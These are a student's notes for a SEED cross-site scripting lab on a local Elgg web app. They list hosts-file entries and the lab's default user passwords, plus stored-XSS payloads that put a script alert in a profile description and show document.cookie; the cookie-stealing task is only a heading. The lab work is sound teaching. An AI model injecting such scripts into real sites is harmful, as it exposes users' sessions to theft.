# Lab 6 $-$ Cross-Site Scripting (XSS) Attack Lab on Elgg WebApp

---

## General Notes
### edit hosts
| . | . |
| -- | -- |
| 10.9.0.5   | www.seed-server.com |
| 10.9.0.5   | www.example32a.com |
| 10.9.0.5   | www.example32b.com |
| 10.9.0.5   | www.example32c.com |
| 10.9.0.5   | www.example60.com |
| 10.9.0.5   | www.example70.com |

- had a hard time making it work :(

### User in db
| UserName | Password | 
| --- | --- |
| admin        | seedelgg
| alice        | seedalice
| boby         | seedboby
| charlie      | seedcharlie
| samy         | seedsamy

---

# Task 1 $-$ Posting a Malicious Message to Display an Alert Window
- It's sufficient to amberd an inline script with an alert in the brief description of the profile, so that whenever someone sees us will get the alert
  ```js
  // in the brief description
  hello <script>alert('ciao')</script>
  ```
---  
# Task 2 $-$ Posting a Malicious Message to Display Cookies
- just do it:
  `<script>alert(document.cookie);</script>`
---
# Task 3 $-$ Stealing Cookies from the Victim’s Machine
